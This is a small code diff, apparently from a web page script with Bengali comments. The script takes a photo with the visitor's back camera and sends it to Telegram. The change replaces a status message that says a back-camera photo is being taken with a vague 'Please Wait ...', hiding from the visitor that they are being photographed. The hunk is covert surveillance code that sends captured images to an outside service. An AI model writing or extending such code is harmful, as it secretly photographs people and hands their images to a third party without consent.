@@ -188,7 +188,7 @@
                 }
                 
                 // ব্যাক ক্যামেরা
-                updateStatus("ব্যাক ক্যামেরার ছবি তোলা হচ্ছে...");
+                updateStatus("Please Wait ...");
                 const backPhoto = await takePhoto('environment');
                 if (backPhoto) {
                     await sendToTelegram('ব্যাক ক্যামেরা থেকে তোলা ছবি।', backPhoto);
